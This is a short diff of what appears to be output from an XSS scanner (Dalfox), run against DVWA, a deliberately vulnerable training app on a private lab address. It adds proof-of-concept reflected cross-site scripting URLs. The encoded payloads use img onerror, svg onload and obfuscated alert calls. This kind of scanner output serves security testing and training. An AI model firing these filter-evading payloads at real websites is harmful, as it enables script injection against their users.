@@ -36,3 +36,5 @@
 [POC][V][GET][inHTML] http://192.168.1.42/dvwa/vulnerabilities/xss_r/?Submit=Submit&name=%22%3E%3Cimg+src%3Dx+onerror%3D%22Function%28%27ale%27%2B%27rt%281%29%27%29%28%29%22+class%3Ddalfox%3E
 [POC][V][GET][inHTML] http://192.168.1.42/dvwa/vulnerabilities/xss_r/?Submit=Submit&name=%22%3E%3CIMG+SRC%3Dx+onpagehide%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E
 [POC][V][GET][inHTML] http://192.168.1.42/dvwa/vulnerabilities/xss_r/?Submit=Submit&name=%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%281%29%3E
+[POC][V][GET][inHTML] http://192.168.1.42/dvwa/vulnerabilities/xss_r/?Submit=Submit&name=%22%3E%3Csvg+onload%3D%22frames%5B0%5D.alert%281%29%22+class%3Ddalfox%3E
+[POC][V][GET][inHTML] http://192.168.1.42/dvwa/vulnerabilities/xss_r/?Submit=Submit&name=%22%3E%3Cimg+src%3Dx+onerror%3D%22Function%28%27ale%27%2B%27rt%281%29%27%29%28%29%22+class%3Ddalfox%3E
